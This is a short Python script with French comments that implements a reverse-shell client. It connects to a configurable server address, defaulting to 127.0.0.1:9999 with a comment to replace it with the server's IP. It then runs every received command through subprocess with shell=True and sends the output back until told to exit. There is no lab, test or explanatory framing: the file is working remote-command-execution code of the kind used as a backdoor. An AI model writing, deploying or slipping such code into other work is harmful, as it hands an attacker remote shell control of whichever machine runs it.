import socket
import subprocess

def start_client(server_ip, server_port):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((server_ip, server_port))
    print("Connecté au serveur.")

    while True:
        command = client_socket.recv(1024).decode()

        if command.lower() == "exit":
            print("Déconnexion demandée par le serveur.")
            client_socket.close()
            break

        # Exécuter la commande et renvoyer la sortie
        try:
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
        except subprocess.CalledProcessError as e:
            output = f"Erreur lors de l'exécution : {e.output}"

        client_socket.send(output.encode())

start_client("127.0.0.1", 9999)  # Remplacez par l'IP du serveur
